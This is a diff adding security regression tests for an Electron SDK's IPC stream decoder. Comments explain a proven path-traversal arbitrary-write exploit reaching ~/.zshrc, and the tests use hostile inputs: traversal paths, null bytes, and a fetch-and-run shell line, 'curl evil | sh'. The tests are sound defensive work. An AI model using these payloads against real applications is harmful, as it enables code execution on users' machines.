@@ -1,4 +1,5 @@
 import type { StreamingCaptureEntry } from '@bugsee/core';
+import { DEFAULT_FILENAMES } from '@bugsee/protocol';
 import { describe, expect, it } from 'vitest';
 import {
   type ControlMessage,
@@ -120,5 +121,69 @@ describe('encodeHello / isHello', () => {
     expect(isHello(encodeControl({ command: 'pause' }))).toBe(false);
     expect(isHello(encodeStreamEntry(streamEntry()))).toBe(false);
     expect(isHello('<<nope>>')).toBe(false);
+  });
+});
+
+// Wave 0.2 (docs/review/REMEDIATION-PLAN.md) — the renderer is UNTRUSTED input.
+//
+// `decodeStreamEntry` parses JSON that arrives over IPC from a renderer, and the preload deliberately
+// exposes `post()` to the page's main world. XSS in loaded content — or a compromised renderer-side npm
+// dependency — is the standard Electron threat model, so every field here is attacker-controlled.
+//
+// The review proved (docs/review/electron.md SEV1 #1) that `t` was passed through verbatim into
+// `store.add({ type })`, reaching `join(chunkDir(...), file)` in the disk-backed chunk store (the DEFAULT
+// on Electron main). A `t` of `../../../../victim/pwned.txt` wrote OUTSIDE the capture root, with
+// attacker-controlled content, append-only — i.e. appending to `~/.zshrc` or any `.js` the app loads is
+// code execution as the user, delivered by the SDK.
+describe('decodeStreamEntry — hostile renderer input', () => {
+  const entry = (over: Record<string, unknown>): string =>
+    JSON.stringify({ k: 'entry', t: 'log', p: { a: 1 }, ...over });
+
+  it('rejects a path-traversal file type (the proven arbitrary-write exploit)', () => {
+    expect(decodeStreamEntry(entry({ t: '../../../../victim/pwned.txt' }))).toBeUndefined();
+  });
+
+  it('rejects any type outside the known FileType set', () => {
+    for (const t of ['', 'logs', 'LOG', 'log/../x', 'a\u0000b', '/abs/path', 'C:\\win', '..']) {
+      expect(decodeStreamEntry(entry({ t }))).toBeUndefined();
+    }
+  });
+
+  it('rejects a non-string type (arrays and objects also reach path.join)', () => {
+    for (const t of [1, true, null, ['log'], { toString: () => 'log' }]) {
+      expect(decodeStreamEntry(entry({ t }))).toBeUndefined();
+    }
+  });
+
+  it('accepts every legitimate FileType', () => {
+    for (const t of [...Object.keys(DEFAULT_FILENAMES), 'attachment']) {
+      expect(decodeStreamEntry(entry({ t }))?.type).toBe(t);
+    }
+  });
+
+  it('rejects a non-numeric timestamp, which lands verbatim in the written frame', () => {
+    // The disk frame is `${timestamp}\t${serialized}\n`, so a string `ts` with newlines injects records —
+    // and was how the proven exploit smuggled a shell script into the written file.
+    for (const ts of [
+      '#!/bin/sh\ncurl evil | sh',
+      {},
+      [],
+      true,
+      Number.NaN,
+      Number.POSITIVE_INFINITY,
+    ]) {
+      expect(decodeStreamEntry(entry({ ts }))).toBeUndefined();
+    }
+  });
+
+  it('still accepts a well-formed entry, and defaults an absent timestamp', () => {
+    expect(decodeStreamEntry(entry({ ts: 1700000000000 }))?.timestamp).toBe(1700000000000);
+    expect(decodeStreamEntry(entry({}))?.timestamp).toBe(0);
+  });
+
+  it('rejects non-numeric seq / mono / timeOrigin rather than coercing them', () => {
+    for (const field of ['s', 'mono', 'o']) {
+      expect(decodeStreamEntry(entry({ [field]: 'x' }))).toBeUndefined();
+    }
   });
 });
